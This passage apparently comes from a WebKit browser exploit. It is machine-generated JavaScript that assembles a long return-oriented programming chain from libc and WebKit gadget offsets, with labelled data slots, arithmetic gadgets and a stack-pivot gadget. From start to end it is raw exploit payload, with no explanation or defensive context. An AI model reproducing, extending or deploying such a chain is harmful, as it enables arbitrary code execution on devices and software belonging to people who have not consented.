libc_base+792472 //pop rcx
]);
//L1462:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1463:
libc_base+788575, //pop rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+121384, //L1464
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1464:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1465:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+121488, //L1467
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+121504, //L1468
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1467:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1468:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+121648, //L1472
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+121616, //L1470
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+121632, //L1471
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1470:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1471:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1472:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+121720, //L1474
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1474:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+121776, //L1475
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1475:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+121856, //L1479
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1479:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1477:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1478:
db([32, 0]); // 0x20
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+121960, //L1480
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+121976, //L1481
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1480:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1481:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+122064, //L1483
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1483:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+122120, //L1484
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1484:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+122192, //L1487
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1487:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+122248, //L1489
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1489:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+122336, //L1490
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1490:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1491:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+122440, //L1493
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+122456, //L1494
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1493:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1494:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+122600, //L1498
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+122568, //L1496
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+122584, //L1497
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1496:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1497:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1498:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+122672, //L1500
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1500:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+122728, //L1501
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1501:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+122808, //L1505
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1505:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1503:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1504:
db([37, 0]); // 0x25
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+122912, //L1506
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+122928, //L1507
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1506:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1507:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+123016, //L1509
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1509:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+123072, //L1510
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1510:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+123176, //L1512
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1512:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1513:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+123280, //L1515
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+123296, //L1516
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1515:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1516:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+123440, //L1520
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+123408, //L1518
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+123424, //L1519
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1518:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1519:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1520:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+123512, //L1522
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1522:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+123568, //L1523
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1523:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+123648, //L1527
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1527:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1525:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1526:
db([33, 0]); // 0x21
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+123752, //L1528
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+123768, //L1529
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1528:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1529:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+123856, //L1531
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1531:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+123912, //L1532
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1532:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+123984, //L1535
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1535:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+124040, //L1537
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1537:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1538:
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+124176, //L1539
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1539:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1540:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+124280, //L1542
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+124296, //L1543
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1542:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1543:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+124440, //L1547
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+124408, //L1545
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+124424, //L1546
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1545:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1546:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1547:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+124512, //L1549
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1549:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+124568, //L1550
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1550:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+124648, //L1554
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1554:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1552:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1553:
db([34, 0]); // 0x22
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+124752, //L1555
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+124768, //L1556
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1555:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1556:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+124856, //L1558
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1558:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+124912, //L1559
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1559:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+124984, //L1562
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1562:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+125040, //L1564
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1564:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1565:
libc_base+811575, //pop rsp
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+125176, //L1566
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1566:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1567:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+125280, //L1569
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+125296, //L1570
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1569:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1570:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+125440, //L1574
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+125408, //L1572
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+125424, //L1573
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1572:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1573:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1574:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+125512, //L1576
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1576:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+125568, //L1577
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1577:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+125648, //L1581
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1581:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1579:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1580:
db([35, 0]); // 0x23
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+125752, //L1582
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+125768, //L1583
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1582:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1583:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+125856, //L1585
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1585:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+125912, //L1586
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1586:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+125984, //L1589
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1589:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+126040, //L1591
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1591:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+126128, //L1592
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1592:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1593:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+126232, //L1595
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+126248, //L1596
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1595:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1596:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+126392, //L1600
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+126360, //L1598
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+126376, //L1599
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1598:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1599:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1600:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+126472, //L1601
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1601:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1602:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+126576, //L1604
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+126592, //L1605
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1604:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1605:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+126736, //L1609
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+126704, //L1607
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+126720, //L1608
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1607:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1608:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1609:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+126808, //L1611
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1611:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+126864, //L1612
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1612:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+126944, //L1616
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1616:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1614:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1615:
db([36, 0]); // 0x24
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+127048, //L1617
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+127064, //L1618
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1617:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1618:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+127152, //L1620
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1620:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+127208, //L1621
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1621:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+127280, //L1624
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1624:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+127336, //L1626
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1626:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
